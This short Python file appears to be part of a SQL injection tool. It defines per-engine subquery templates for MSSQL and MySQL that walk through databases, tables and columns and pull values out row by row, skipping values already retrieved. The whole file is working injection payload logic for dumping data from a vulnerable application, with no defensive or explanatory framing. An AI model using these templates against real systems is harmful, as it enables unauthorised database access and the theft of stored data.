ENGINES = {
    "mssql": {
        "type":    "mssql",
        "tables":  "(SELECT TOP 1 name FROM sysobjects "
                   "WHERE xtype='U' AND name NOT IN ({seen}))",
        "columns": "(SELECT TOP 1 name FROM syscolumns "
                   "WHERE id=(SELECT id FROM sysobjects WHERE name='{t}') "
                   "AND name NOT IN ({seen}))",
        "value":   "(SELECT TOP 1 CAST({c} AS VARCHAR(8000)) FROM {t} "
                   "WHERE CAST({c} AS VARCHAR(8000)) NOT IN ({seen}))",
        "bases":   "(SELECT TOP 1 name FROM sys.databases WHERE name NOT IN ({seen}))"
    },
    "mysql": {
        "type":    "mysql",
        "tables":  "(SELECT table_name FROM information_schema.tables "
                   "WHERE table_schema=database() "
                   "AND table_name NOT IN ({seen}) LIMIT 1)",
        "columns": "(SELECT column_name FROM information_schema.columns "
                   "WHERE table_schema=database() AND table_name='{t}' "
                   "AND column_name NOT IN ({seen}) LIMIT 1)",
        "value":   "(SELECT CAST({c} AS CHAR) FROM {t} "
                   "WHERE CAST({c} AS CHAR) NOT IN ({seen}) LIMIT 1)",
        "bases":   "(SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ({seen}) LIMIT 1)"
    },
}